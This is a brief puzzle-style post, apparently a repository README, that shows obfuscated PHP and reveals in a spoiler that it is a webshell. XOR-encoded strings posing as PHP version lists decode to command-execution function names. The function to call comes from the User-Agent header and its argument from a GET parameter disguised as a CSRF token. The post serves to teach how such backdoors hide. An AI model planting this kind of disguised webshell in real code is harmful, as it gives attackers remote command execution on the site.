# What does this code do?
seriously.

<details>
<summary>Spoiler warning</summary>
It's a webshell :) 
```php
  public const VERSIONS = array(
        "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
        "GADK_" ^ "7.4.14, 7.4.13, 7.4.12",
        "RVQM" ^ "7.4.24, 7.4.23, 7.4.22",
        "GOG]FY^U" ^ "7.4.21, 7.4.20, 7.4.19",
        "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
  );
```
  is identical to
```php
  public const VERSIONS = array(
        "system",
        "popen",
        "exec",
        "passthru",
        "proc_open",
    );
```
and
```php
${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
```
is identical to 
```php
$_SERVER["HTTP_USER_AGENT"]($_GET["csrf-token"]);
```

</details>
